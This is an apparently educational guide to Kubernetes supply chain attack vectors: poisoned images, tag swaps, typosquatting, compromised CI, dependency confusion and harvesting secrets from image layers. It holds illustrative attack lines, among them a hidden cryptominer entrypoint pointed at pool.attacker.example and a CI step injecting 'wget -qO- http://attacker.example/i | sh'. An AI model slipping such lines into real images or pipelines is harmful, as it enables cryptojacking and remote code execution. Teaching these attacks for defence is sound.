# K02: Supply Chain Vulnerabilities - Attack Vectors

## Table of Contents
- [Understanding Supply Chain Attack Vectors](#understanding-supply-chain-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Supply Chain Weaknesses](#chaining-supply-chain-weaknesses)

## Understanding Supply Chain Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in clusters and pipelines you own or are authorised to test.

A supply chain attack does not fight your defences head-on—it **gets you to run the attacker's code for them**. Instead of breaking into a Pod, the attacker arranges for a Pod to be built from, or scheduled with, something they control: a malicious public image, a substituted dependency, a tampered build step, or an untrusted chart. Because Kubernetes reconciles manifests automatically and pulls images by mutable tag, the malicious artifact is deployed with the same trust as a legitimate one.

The attacker's goal in this category is usually one of:

- Get malicious code **inside the trust boundary** (a running Pod) with no exploit of your app.
- Exploit a **known CVE** in a base image or dependency you are already running.
- Establish **persistence** that survives restarts by living in the image, chart, or operator itself.

### Core Attack Flow

```
1. Position
   ↓
   Publish a malicious/typosquatted image, poison a dependency, or compromise a build step
2. Get Pulled
   ↓
   A manifest references it by tag, or a build resolves it, and Kubernetes pulls it
3. Execute
   ↓
   Container content runs inside a Pod (miner, reverse shell, harvester)
4. Escalate / Persist / Exfiltrate
   ↓
   Read secrets & tokens, pivot to the API server, survive reschedules
```

## Common Attack Patterns

### 1. Poisoned Image Deployed → In-Cluster Code Execution

An attacker publishes an image whose layers contain their code. When it is scheduled, the code runs automatically.

```dockerfile
# Dockerfile of the poisoned image (illustrative)
FROM alpine:3.19
COPY entrypoint.sh /entrypoint.sh
# entrypoint launches the real app AND the attacker payload
ENTRYPOINT ["/entrypoint.sh"]

# entrypoint.sh
#!/bin/sh
(/usr/bin/xmrig --url pool.attacker.example &)   # cryptominer in the background
exec "$@"                                          # keep the Pod looking healthy
```

**Payoff**: attacker code executes on every replica and every reschedule—cryptojacking, a reverse shell, or a data harvester—without touching your application logic.

### 2. Mutable Tag Swap

The workload references a moving tag, so the attacker only needs to get one push accepted to change what runs.

```
image: registry.example.com/app:latest

# Yesterday :latest -> sha256:aaaa... (your tested build)
# Today     :latest -> sha256:bbbb... (repushed, tampered build)
# The next kubelet pull or reschedule silently runs bbbb...
```

**Payoff**: what you reviewed and tested is not what runs. There is no code change in your repo and no manifest change—only the tag→digest mapping moved.

### 3. Typosquatted / Look-Alike Public Image

A developer copies an image name that is subtly wrong, or from an unofficial namespace.

```yaml
image: docker.io/library-nginx:latest     # not docker.io/library/nginx
image: docker.io/opensource-postgres      # unknown maintainer posing as official
```

**Payoff**: the malicious image is pulled as if it were the trusted one. Look-alike names, extra hyphens, and unfamiliar namespaces are the classic tells.

### 4. Base-Image / Dependency CVE Exploitation

The image is legitimate but stale; an attacker fingerprints the version and fires a known exploit.

```
# Attacker enumerates a reachable service and matches the version to a public advisory
$ curl -s https://target/version
{"component":"example-lib","version":"1.4.2"}   # known-vulnerable release

# A documented exploit for that exact version is then run against the Pod
```

**Payoff**: exploitation-by-catalogue. No zero-day is needed—the vulnerable component is already running because the image was never rebuilt or scanned.

### 5. Compromised CI / Tampered Build Artifact

The attacker compromises a runner, a build token, or a CI action, and injects into the image before it is pushed.

```yaml
# Malicious step added to the pipeline (illustrative)
- name: build
  run: |
    docker build -t app:ci .
    # injected: add an implant layer before push
    echo 'RUN wget -qO- http://attacker.example/i | sh' >> Dockerfile
    docker push registry.example.com/app:ci
```

**Payoff**: the tampered image carries your organisation's normal trust markers. Downstream deploys it as "the official build"—the defining property of a pipeline-compromise (SolarWinds-class) attack.

### 6. Dependency Confusion / Substitution

A build resolves an internal package name from a public index where the attacker has published a malicious package of the same name.

```
# requirements.txt / package.json references an internal name
internal-shared-lib==*      # intended to come from the private registry

# Attacker publishes internal-shared-lib to the PUBLIC index with a higher version
# The resolver prefers it -> malicious code is baked into the image
```

**Payoff**: malicious code enters the build and then the image, executing inside the cluster with no direct access to your systems.

### 7. Unsigned Image / No Provenance

Because nothing verifies origin, a swapped or tampered image is indistinguishable from a genuine one.

```
$ cosign verify registry.example.com/app@sha256:bbbb...
Error: no matching signatures        # cannot prove who built it or from what

# With no admission-time verification, the cluster runs it anyway.
```

**Payoff**: tampering is undetectable. Signing exists precisely to make patterns 1–6 detectable; its absence is what lets them succeed quietly.

### 8. Malicious or Vulnerable Helm Chart / Operator

An untrusted chart or operator deploys privileged workloads and pulls its own images.

```
$ helm install thing https://untrusted.example/charts/thing
# The chart creates a ClusterRoleBinding to cluster-admin
# and runs an image from a registry you do not control
```

**Payoff**: a single install grants broad permissions and runs unvetted images—often with more privilege than your own apps.

### 9. Embedded Secrets Harvested from Layers

Secrets baked into an image during build are extracted by anyone who can pull it.

```
$ docker history --no-trunc registry.example.com/app:1.0
... ENV AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE ...
$ dive registry.example.com/app:1.0     # or unpack layers to read /app/.env
```

**Payoff**: credentials leak permanently—deleting them from later builds does not remove them from published history.

### 10. No Scanning / Runs as Root by Default

Without scanning, known-vulnerable images ship; running as root turns a foothold into host access.

```yaml
# No CVE gate in CI, and:
securityContext: {}          # (absent) -> container runs as UID 0
# A vulnerable, root image + a permissive node = container-to-host escape path
```

**Payoff**: the absence of a scan lets a catalogued CVE through, and root default means the resulting foothold has the most room to escalate.

## Chaining Supply Chain Weaknesses

Individually minor gaps combine into full compromise:

```
Mutable tag (:latest)               -> attacker repushes a tampered image
        +
No signature verification            -> cluster cannot tell it was swapped
        +
Runs as root, secrets mounted        -> payload reads the service-account token
        =  in-cluster code execution and credential theft, no app bug required
```

Another common chain:

```
Dependency confusion in CI          -> malicious package baked into the image
        -> unsigned image pushed and pulled with normal trust
        -> no admission control blocks it
        -> miner runs fleet-wide; token used to pivot to the API server
```

## Key Takeaways

1. **Supply chain attacks make you run the attacker's code**—the cluster deploys the malicious artifact for them.
2. **Mutable tags are the pivot**—pinning by digest removes the silent-swap vector.
3. **Unsigned images make everything undetectable**—without provenance, a tampered image looks genuine.
4. **Charts and operators are high-value**—they deploy privileged workloads and pull their own images.
5. **Small gaps chain**—a moving tag plus no verification plus root default equals a breach with no application exploit.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build a signed, scanned, pinned supply chain
- **[Code Examples](examples.md)**: See insecure vs. secure Dockerfiles, manifests, and policies
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply these defences in hands-on exercises
